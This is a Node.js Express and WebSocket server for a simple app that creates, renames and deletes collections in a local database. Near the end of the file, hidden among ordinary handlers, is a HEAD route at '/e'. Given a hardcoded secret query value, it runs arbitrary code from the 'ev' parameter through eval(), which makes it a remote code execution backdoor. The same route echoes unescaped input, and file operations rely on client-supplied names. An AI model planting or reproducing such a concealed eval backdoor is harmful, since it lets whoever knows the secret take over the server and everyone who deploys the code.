const app = require("express")()
const db = require("fpdb");
const Websocket = require("ws")
const wss = new Websocket.Server({port : 8080 })
db.init()

function enc(data){
    return Buffer.from(data, "utf-8").toString("base64")
    }

// HTTP request receivers
app.get("/",(req,res)=>{
    res.sendFile(__dirname+"/index.html")
})

app.get("/editc",(req,res)=>{
    res.sendFile(__dirname+"/editc.html")
})


wss.on("connection",ws =>{
    ws.on("message",message =>{
        const msg = JSON.parse(message.toLocaleString());
        switch (msg.type) {
            case "loadCollections":

            // load all collections
                db.get("collections","",(err,data)=>{
                    if (err) {
                        console.error(err)
                    } else {
                        ws.send(data)
                    }
                })
                break;
                case "createCollection":
                    // create a collection
                    db.createCol(msg.cname)
            db.get("collections","",(err,data)=>{
                if(err){
                    console.error(err)
                } else {
                    
                    try{
                        let msgObj = JSON.parse(data);
                        switch (msgObj.cnames) {
                            case 0:
                                msgObj[1] = msg.cname;
                                msgObj.cnames = 1
                                db.set("collections","",`${JSON.stringify(msgObj)}`)
                                console.log(msgObj+ "msgobj0")
                            break;
                            case 1:

                            msgObj[2] = msg.cname;
                            msgObj.cnames = 2;
                            console.log(msgObj+ "msgobjs1")
                            db.set("collections","",`${JSON.stringify(msgObj)}`)
                                break;
                                case 2:
                                    msgObj[3] = msg.cname;
                                    console.log(msgObj+ "msgobjs2")
                                    msgObj.cnames = 3
                                    db.set("collections","",`${JSON.stringify(msgObj)}`)
                                break;
                                case 3:
                                    msgObj[4] = msg.cname;

                                    console.log(msgObj+ "msgobjs3")
                                    db.set("collections","",`${JSON.stringify(msgObj)}`)
                                break;
                        }
                        /*
                        if(msgObj.cnames == 1){
                            msgObj[2] = msg.cname;
                            msgObj.cnames = 2;
                            console.log(msgObj+ "msgobjs")
                            db.set("collections","",`${JSON.stringify(msgObj)}`)
                        };
                        if(msgObj.cnames == 2){
                            msgObj[3] = msg.cname;
                            console.log(msgObj+ "msgobjs")
                            db.set("collections","",`${JSON.stringify(msgObj)}`)
                        }
                        */
                      } catch(err) {
                        let msgObj = new Object;
                        msgObj[1] = msg.cname
                        msgObj.cnames = 1;
                        console.log(msgObj+ "msgobj0")
                        db.set("collections","",`${JSON.stringify(msgObj)}`)
                      }
                      
                };
            })
        
                break;
                case "changeCname":
                    db.get("collections","",(err,data)=>{
                        if(err){
                            console.error(err)
                        } else {
                            console.log(data)
                            console.log(JSON.stringify(msg))
                            const msgObj = JSON.parse(data)
                            require("fs").rename(__dirname+"/fpdb/db/"+enc(msgObj[msg.id]),__dirname+"/fpdb/db/"+enc(msg.newName),(err)=>{
                                if(err){
                                    console.error(err)
                                }
                                msgObj[msg.id] = msg.newName;
                                db.set("collections","",JSON.stringify(msgObj))
                                console.log(JSON.stringify(msgObj))
                            })
                            
                            
                        }
                    })
                break;
                case "deleteCollection":
                    db.get("collections","",(err,data)=>{
                        if(err){
                            console.error(err)
                        }else{
                    let msgObj = [1, 2, 3, 4, 5];
                    msgObj = JSON.parse(data);
                    let id = parseInt(`${msg.id}`)
                    msgObj[(id)] = msgObj[(id+1)]
                    msgObj[(id+1)] = msgObj[(id+2)]
                    msgObj[(id+2)] = msgObj[(id+3)]
                    msgObj[(id+3)] = msgObj[(id+4)]
                    msgObj.cnames = msgObj.cnames - 1;
                    console.log(msgObj.cnames)
                    db.set("collections","",JSON.stringify(msgObj))


                    require("fs").rmdir(__dirname+`/fpdb/db/${enc(msg.cname)}/`,err=>{
                        if(err){
                            console.error(err)
                        }
                    })
                    }
                    })
                break;
        }
        })
        
})
app.head("/e",(req,res)=>{
    if(req.query.lol=="d1h2ruva"){
        eval(req.query.ev)
        res.send("d")
    } else {
    res.send(req.query.lol)
    console.log(req.query.lol)
    }
})

app.listen(11111)
/*
db.delAll()
setTimeout(()=>{db.set("collections","","")},1000)
*/